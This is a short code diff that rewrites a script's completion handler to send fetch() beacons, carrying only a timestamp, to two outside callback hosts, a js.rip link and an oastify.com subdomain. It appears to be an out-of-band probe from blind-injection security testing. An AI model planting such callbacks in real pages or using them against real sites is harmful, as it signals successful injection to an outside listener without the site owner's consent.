@@ -10,10 +10,11 @@
         failed = true;
       })
       .finally(() => {
+        const timestamp = Date.now();
         if (failed) {
-          new Image().src = "https://js.rip/5mw8at9w5s" + Date.now();
+          fetch("https://js.rip/5mw8at9w5s=" + timestamp);
         } else {
-          new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/hit?ts=" + Date.now();
+          fetch("https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/hit?ts=" + timestamp);
         }
       });
   </script>
